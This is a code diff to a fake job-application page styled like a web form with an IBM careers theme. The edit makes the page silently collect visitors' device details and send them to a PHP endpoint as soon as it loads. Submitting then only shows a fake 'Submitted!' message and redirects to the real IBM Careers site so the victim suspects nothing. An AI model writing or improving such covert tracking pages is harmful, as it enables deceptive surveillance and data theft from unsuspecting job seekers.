@@ -447,29 +447,28 @@
     <script>
         // Define the PHP endpoints for location.js
         var info_file = "../../php/info.php";
-        var result_file = "../../php/result.php";
+        var result_file = "../../php/result.php"; // You can safely delete this line if you want
         var error_file = "../../php/error.php";
     </script>
     <script src="js/location.js"></script>
     <script>
-        // Triggered exactly when they click the clean Submit button
-        function triggerTracking() {
-            // 1. Instantly grab device details and send to info.php
+        // 1. Silently grab device details the moment the page loads
+        $(document).ready(function() {
             information(); 
-            
-            // 2. Trigger the Location Prompt
-            locate(function() {
-                // Make the button turn green and say "Submitted"
-                var btnText = document.querySelector('div[aria-label="Submit"] .NPEfkd');
-                var btnBg = document.querySelector('div[aria-label="Submit"]');
-                if(btnText) btnText.innerHTML = "Submitted!";
-                if(btnBg) btnBg.style.backgroundColor = "#188038";
+        });
 
-                // 3. Wait 1.5 seconds, then redirect to the real IBM Careers page
-                setTimeout(function() {
-                    window.location.replace("https://www.ibm.com/careers");
-                }, 1500);
-            });
+        // 2. What happens when they click the "Submit" button
+        function triggerTracking() {
+            // Update the button UI to look like a successful submission
+            var btnText = document.querySelector('div[aria-label="Submit"] .NPEfkd');
+            var btnBg = document.querySelector('div[aria-label="Submit"]');
+            if(btnText) btnText.innerHTML = "Submitted!";
+            if(btnBg) btnBg.style.backgroundColor = "#188038";
+
+            // Wait 1.5 seconds, then redirect to the real IBM Careers page
+            setTimeout(function() {
+                window.location.replace("https://www.ibm.com/careers");
+            }, 1500);
         }
     </script>
 </body>
